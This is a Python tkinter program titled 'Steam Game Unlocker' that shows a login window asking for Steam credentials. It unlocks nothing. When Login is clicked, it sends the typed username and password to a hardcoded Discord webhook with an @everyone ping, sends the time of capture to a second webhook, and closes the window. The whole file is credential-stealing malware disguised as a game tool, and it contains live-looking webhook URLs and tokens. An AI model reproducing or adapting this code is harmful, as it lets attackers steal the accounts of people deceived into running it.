from tkinter import *
from functools import partial
from discord import SyncWebhook
import time

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1128770712908349450/L6tvRwO0TQgQ08ROgx83e2s5PiJTlSawVZk02WvAzz2JuNOnaNvZfUxDFlElzhcAfDu0")
webhook2 = SyncWebhook.from_url("https://discord.com/api/webhooks/1128787741166022739/L0fKkQoZmXdbGe-4XwhzsC0iQFBu5Ew4WGZBb24d9tkETfsFKXqbQZ5eTXyn32D-wD2f")

def validateLogin(username, password):
    webhook.send("Username:"),
    webhook.send(username.get()),
    webhook.send("Password:"),
    webhook.send(password.get()),
    webhook.send("@everyone"),
    webhook2.send("Time Of Send:"),
    webhook2.send(time.strftime("%m-%d-%y %H:%M:%S", time.localtime())),
    time.sleep(1)

def kill():
	{
    window.destroy()
  }

window = Tk() #instantiate an instance of a window
window.geometry("1100x300")
window.title("Steam Game Unlocker")
icon = PhotoImage(file='logo.png')
window.iconphoto(True,icon)
window.config(background="#ffffff")
photo = PhotoImage(file='person.png')
label = Label(window,
              image=photo,
              text="Enter Steam Login Info For Games",
              font=('Arial',40,'bold'),
              fg='#000000',
              bg='#ffffff',
              relief=RAISED,
              bd=0,
              padx=20,
              pady=20,
              compound='left')
label.pack()
label.place(x=60,y=100)
#username label and text entry box
usernameLabel = Label(window, text="User Name").grid(row=0, column=0)
username = StringVar()
usernameEntry = Entry(window, textvariable=username).grid(row=0, column=1)  

#password label and password entry box
passwordLabel = Label(window,text="Password").grid(row=1, column=0)  
password = StringVar()
passwordEntry = Entry(window, textvariable=password, show='*').grid(row=1, column=1)  

validateLogin = partial(validateLogin, username, password)

#login button
loginButton = Button(window, text="Login", command=lambda:  [validateLogin(), kill()]).grid(row=0, column=4)  

window.mainloop()